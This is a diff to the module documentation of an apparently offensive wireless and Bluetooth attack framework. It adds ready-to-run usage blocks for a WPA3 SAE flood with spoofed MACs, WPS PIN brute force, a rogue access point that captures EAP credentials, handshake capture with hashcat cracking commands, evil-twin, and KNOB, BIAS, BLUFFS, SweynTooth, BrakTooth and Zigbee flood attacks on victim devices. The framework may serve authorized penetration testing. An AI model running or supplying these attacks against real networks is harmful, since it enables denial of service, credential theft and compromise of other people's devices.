@@ -339,4 +339,310 @@ run
 
 ---
 
+---
+
+## New in v1.2.0 — integrated from submodule audit
+
+### wpa3_sae_flood_native
+
+Native Scapy SAE commit flood (WPA3 DoS / transition-mode downgrade). No external binary needed.
+
+```
+use generic/wifi_lab/wpa3_sae_flood_native
+set interface wlan0mon
+set target_bssid AA:BB:CC:DD:EE:FF
+set channel 6
+set frame_count 500        # 0 = continuous until Ctrl+C
+set interval 0.0           # max speed
+set randomize_src true     # spoof source MAC per frame
+set i_know_scope true
+run
+```
+
+---
+
+### wifi_security_analyzer
+
+Passive Wi-Fi scan: parses beacons/probe-responses, classifies each BSS as
+WEP / WPA / WPA2-TKIP / WPA2-CCMP / WPA2-Enterprise / WPA3-SAE / WPA3-Transition / WPA3-OWE / OPEN.
+Detects WPS, hidden SSIDs, and MFP status. No external binary needed.
+
+```
+use generic/wifi_lab/wifi_security_analyzer
+set interface wlan0mon
+set scan_time 30.0
+set channel 0              # 0 = auto channel-hop
+set filter_security ""     # filter: WEP, WPA2-TKIP, WPA3-SAE, OPEN, etc.
+set show_hidden true
+set i_know_scope true
+run
+```
+
+---
+
+### bully_bridge
+
+WPS PIN brute-force via bully (C binary, GPL-2.0). Faster alternative to reaver on some APs.
+Host prereq: `apt install bully`.
+
+```
+use generic/external/bully_bridge
+set interface wlan0mon
+set target_bssid AA:BB:CC:DD:EE:FF
+set channel 6
+set essid "TargetNetwork"
+set pixie_dust false       # true = Pixie Dust attack
+set pin ""                 # specific PIN to try (empty = full brute-force)
+set i_know_scope true
+run
+```
+
+---
+
+### hostapd_wpe_bridge
+
+WPE (Wireless Pwnage Edition) rogue AP for EAP/PEAP/MSCHAPv2 credential capture.
+Host prereq: `apt install hostapd-wpe`.
+
+```
+use generic/external/hostapd_wpe_bridge
+# mode: start | config | crack-hint
+set mode start
+set interface wlan0
+set ssid "CorporateNetwork"
+set channel 6
+set log_file /tmp/wpe_credentials.log
+set i_know_scope true
+run
+
+# After capture, show hashcat commands:
+set mode crack-hint
+run
+```
+
+---
+
+### hcxdumptool_live_bridge
+
+Live PMKID + EAPOL capture via hcxdumptool. Separate from `hcx_toolchain_bridge` (post-processing).
+Host prereq: `apt install hcxdumptool hcxtools`.
+
+```
+use generic/external/hcxdumptool_live_bridge
+set interface wlan0          # hcxdumptool handles monitor mode internally
+set timeout 60               # seconds; 0 = unlimited
+set target_bssid ""          # comma-separated BSSIDs, empty = all
+set convert_after true       # auto-run hcxpcapngtool -> .hc22000 after capture
+set i_know_scope true
+run
+# Output: .tmp/capture.pcapng + .tmp/capture.pcapng.hc22000
+# Crack: hashcat -m 22000 .tmp/capture.pcapng.hc22000 wordlist.txt
+```
+
+---
+
+### sniffair_passive_recon
+
+SniffAir passive Wi-Fi recon + Auto-EAP credential capture. Can import SniffAir natively
+(submodule) or invoke as subprocess. Host prereq: SniffAir submodule initialized.
+
+```
+use generic/external/sniffair_passive_recon
+# mode: sniff | auto_eap | auto_psk | handshaker | info
+set mode info
+run
+
+set mode sniff
+set interface wlan0mon
+set timeout 60
+set i_know_scope true
+run
+```
+
+---
+
+### pwnagotchi_bridge
+
+Pwnagotchi AI-based WPA handshake harvester: query device status, pull .pcap files via rsync/scp,
+convert and crack with hashcat. Requires SSH access to the Pwnagotchi device (USB tether default: 10.0.0.2).
+
+```
+use generic/external/pwnagotchi_bridge
+# mode: info | status | pull_handshakes | crack
+set mode status
+set device_ip 10.0.0.2
+run
+
+set mode pull_handshakes
+set local_handshake_dir .tmp/pwnagotchi_handshakes
+set i_know_scope true
+run
+
+set mode crack
+set wordlist /path/to/rockyou.txt
+run
+```
+
+---
+
+### hashcatch_bridge
+
+Purely passive WPA/WPA2 handshake capture (no transmission). Compatible with aircrack-ng and hashcat.
+Host prereq: `hashcatch` binary in PATH or compiled in submodule.
+
+```
+use generic/external/hashcatch_bridge
+set interface wlan0
+set output_dir .tmp/hashcatch_captures
+set timeout 120
+set i_know_scope true
+run
+# Crack: aircrack-ng -w wordlist.txt .tmp/hashcatch_captures/*.cap
+```
+
+---
+
+### wirespy_bridge
+
+Automated Wi-Fi monitor mode, channel hopping, SSID discovery and evil-twin via Bash subprocess.
+Host prereq: wirespy submodule initialized.
+
+```
+use generic/external/wirespy_bridge
+# mode: monitor | scan | evil_twin | help
+set mode monitor
+set interface wlan0
+set i_know_scope true
+run
+```
+
+---
+
+### knob_attack_bridge
+
+KNOB (Key Negotiation Of Bluetooth) — forces 1-byte entropy in BT BR/EDR link key (CVE-2019-9506).
+
+```
+use generic/bluetooth/knob_attack_bridge
+# mode: info | poc | internalblue
+set mode info
+run
+
+set mode poc
+set victim_a_mac AA:BB:CC:DD:EE:FF
+set victim_b_mac 11:22:33:44:55:66
+set attacker_hci hci0
+set forced_entropy 1
+set i_know_scope true
+run
+```
+
+---
+
+### bias_attack_bridge
+
+BIAS (Bluetooth Impersonation AttackS) — impersonates BT BR/EDR device without LTK (CVE-2020-10135).
+
+```
+use generic/bluetooth/bias_attack_bridge
+# mode: info | legacy_bypass | role_switch
+set mode info
+run
+
+set mode legacy_bypass
+set victim_mac AA:BB:CC:DD:EE:FF
+set attacker_hci hci0
+set i_know_scope true
+run
+```
+
+---
+
+### ble_bluffs_native
+
+BLUFFS — BLE session key downgrade breaking forward and future secrecy (CVE-2023-24023).
+
+```
+use generic/bluetooth/ble_bluffs_native
+# mode: info | poc | framing
+set mode info
+run
+
+set mode poc
+set victim_mac AA:BB:CC:DD:EE:FF
+set attack_variant 1    # 1-6: see mode=info for description
+set i_know_scope true
+run
+```
+
+---
+
+### ble_sweyntooth_bridge
+
+SweynTooth 12+ BLE stack vulnerabilities affecting TI, NXP, Dialog, Microchip, ST, Telink, Cypress SoCs.
+Host prereq: nRF52-series dongle with SweynTooth firmware. Submodule must be initialized.
+
+```
+use generic/bluetooth/ble_sweyntooth_bridge
+set mode list
+run
+
+set mode llid_deadlock
+set victim_mac AA:BB:CC:DD:EE:FF
+set dongle_port /dev/ttyACM0
+set i_know_scope true
+run
+```
+
+---
+
+### braktooth_bridge
+
+BrAcketooth 16+ BT Classic (BR/EDR) stack attacks: deadlock, memory corruption, L2CAP abuse.
+Targets Intel, Qualcomm, Jieli, Silicon Labs, Cypress, Espressif chipsets.
+
+```
+use generic/bluetooth/braktooth_bridge
+set mode list
+run
+
+set mode lmp_max_slot_overflow
+set victim_mac AA:BB:CC:DD:EE:FF
+set device_port /dev/ttyUSB1
+set i_know_scope true
+run
+```
+
+---
+
+### killerbee_zigbee_bridge
+
+Zigbee / IEEE 802.15.4 attacks via KillerBee Python framework.
+Requires 802.15.4 hardware (RZUSB, APIMOTE, CC253x, TelosB, etc.).
+Install: `pip install killerbee` or initialize the killerbee submodule.
+
+```
+use generic/bluetooth/killerbee_zigbee_bridge
+# mode: zbid | zbdump | zbreplay | zbstumbler | zbassocflood | zbscapy
+set mode zbid
+run
+
+set mode zbdump
+set channel 15
+set output_file .tmp/zigbee_capture.pcap
+set count 0
+set i_know_scope true
+run
+
+set mode zbassocflood
+set channel 15
+set pan_id 0x1234
+set flood_count 100
+set i_know_scope true
+run
+```
+
+---
+
 *See [docs/FULL_CATALOG.md](../FULL_CATALOG.md) for the complete auto-generated module index.*
+*See [docs/INTEGRATION_AUDIT.md](../INTEGRATION_AUDIT.md) for the full submodule audit.*
